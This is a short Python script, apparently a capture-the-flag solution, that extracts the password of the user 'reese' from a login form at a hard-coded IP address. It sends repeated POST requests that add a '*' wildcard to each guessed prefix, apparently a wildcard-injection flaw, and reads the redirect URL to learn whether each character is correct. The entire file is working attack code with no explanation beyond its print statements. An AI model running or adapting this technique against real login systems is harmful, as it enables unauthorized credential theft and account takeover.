import requests
from string import ascii_lowercase, ascii_uppercase

def get_password():
    password = ""
    url = "http://138.68.158.87:32090/login"
    chars = ascii_lowercase+ascii_uppercase+'0123456789_{}()'
    success = False
    while True:
        for char in chars:
            tmp = password+char
            print(f"[*] Trying password: {tmp}")
            res = requests.post(url, data = {
                'username': "reese",
                'password': f"{tmp}*"
            })
            if res.url == "http://138.68.158.87:32090/login?message=Authentication%20failed":
                pass
            else:
                password = tmp
                r = requests.post(url, data = {
                    'username': 'reese',
                    'password': password
                })
                if r.url == "http://138.68.158.87:32090/login?message=Authentication%20failed":
                    break
                else:
                    print("the flag is "+password)
                    exit()

    return password

def main():
    password = get_password()
    print(f"[+] {password}")


if __name__ == "__main__":
    main()
